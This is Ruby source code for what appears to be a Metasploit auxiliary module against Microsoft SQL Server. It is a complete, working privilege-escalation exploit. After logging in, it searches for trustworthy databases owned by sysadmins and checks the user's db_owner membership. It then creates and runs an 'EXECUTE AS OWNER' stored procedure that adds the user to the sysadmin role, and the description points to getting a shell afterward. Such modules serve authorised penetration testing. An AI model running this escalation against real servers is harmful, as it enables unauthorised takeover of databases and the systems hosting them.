##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/mssql_commands'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server Escalate Db_Owner',
      'Description'    => %q{
        This module can be used to escalate privileges to sysadmin if the user has
        the db_owner role in a trustworthy database owned by a sysadmin user.  Once
        the user has the sysadmin role the msssql_payload module can be used to obtain
        a shell on the system.
      },
      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
      'License'        => MSF_LICENSE,
      'References'     => [[ 'URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
    ))
  end

  def run
    # Check connection and issue initial query
    print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...")
    if mssql_login_datastore
      print_good('Connected.')
    else
      print_error('Login was unsuccessful. Check your credentials.')
      disconnect
      return
    end

    # Query for sysadmin status
    print_status("Checking if #{datastore['USERNAME']} has the sysadmin role...")
    user_status = check_sysadmin

    # Check if user has sysadmin role
    if user_status == 1
      print_good("#{datastore['USERNAME']} has the sysadmin role, no escalation required.")
      disconnect
      return
    else
      print_status("You're NOT a sysadmin, let's try to change that")
    end

    # Check for trusted databases owned by sysadmins
    print_status("Checking for trusted databases owned by sysadmins...")
    trust_db_list = check_trust_dbs
    if trust_db_list.nil? || trust_db_list.length == 0
      print_error('No databases owned by sysadmin were found flagged as trustworthy.')
      disconnect
      return
    else
      # Display list of accessible databases to user
      print_good("#{trust_db_list.length} affected database(s) were found:")
      trust_db_list.each do |db|
        print_status(" - #{db[0]}")
      end
    end

    # Check if the user has the db_owner role in any of the databases
    print_status('Checking if the user has the db_owner role in any of them...')
    dbowner_status = check_db_owner(trust_db_list)
    if dbowner_status.nil?
      print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
      disconnect
      return
    end

    # Attempt to escalate to sysadmin
    print_status("Attempting to escalate in #{dbowner_status}!")
    escalate_status = escalate_privs(dbowner_status)
    if escalate_status
      # Check if escalation was successful
      user_status = check_sysadmin
      if user_status == 1
        print_good("Congrats, #{datastore['USERNAME']} is now a sysadmin!.")
      else
        print_error("Fail buckets, something went wrong.")
      end
    else
      print_error("Error while trying to escalate status")
    end

    disconnect
    return
  end

  # Checks if user is already sysadmin
  def check_sysadmin
    # Setup query to check for sysadmin
    sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"

    # Run query
    result = mssql_query(sql)

    # Parse query results
    parse_results = result[:rows]
    status = parse_results[0][0]

    # Return status
    return status
  end

  # Gets trusted databases owned by sysadmins
  def check_trust_dbs
    # Setup query
    sql = "SELECT d.name AS DATABASENAME
    FROM sys.server_principals r
    INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
    INNER JOIN sys.server_principals p ON
    p.principal_id = m.member_principal_id
    inner join sys.databases d on suser_sname(d.owner_sid) = p.name
    WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'"

    result = mssql_query(sql)

    # Return on success
    return result[:rows]
  end

  # Checks if user has the db_owner role
  def check_db_owner(trust_db_list)
    # Check if the user has the db_owner role is any databases
    trust_db_list.each do |db|
      # Setup query
      sql = "use #{db[0]};select db_name() as db,rp.name as database_role, mp.name as database_user
      from [#{db[0]}].sys.database_role_members drm
      join [#{db[0]}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
      join [#{db[0]}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
      where rp.name = 'db_owner' and mp.name = SYSTEM_USER"

      # Run query
      result = mssql_query(sql)

      # Parse query results
      parse_results = result[:rows]
      if parse_results && parse_results.any?
        print_good("- db_owner on #{db[0]} found!")
        return db[0]
      end
    end

    nil
  end

  def escalate_privs(dbowner_db)
    print_status("#{dbowner_db}")
    # Create the evil stored procedure WITH EXECUTE AS OWNER
    evil_sql_create = "use #{dbowner_db};
    DECLARE @myevil as varchar(max)
    set @myevil = '
    CREATE PROCEDURE sp_elevate_me
    WITH EXECUTE AS OWNER
    as
    begin
    EXEC sp_addsrvrolemember ''#{datastore['USERNAME']}'',''sysadmin''
    end';
    exec(@myevil);
    select 1;"
    mssql_query(evil_sql_create)

    # Run the evil stored procedure
    evilsql_run = "use #{dbowner_db};
    DECLARE @myevil2 as varchar(max)
    set @myevil2 = 'EXEC sp_elevate_me'
    exec(@myevil2);"
    mssql_query(evilsql_run)

    # Remove evil procedure
    evilsql_remove = "use #{dbowner_db};
    DECLARE @myevil3 as varchar(max)
    set @myevil3 = 'DROP PROCEDURE sp_elevate_me'
    exec(@myevil3);"
    mssql_query(evilsql_remove)

    true
  end
end
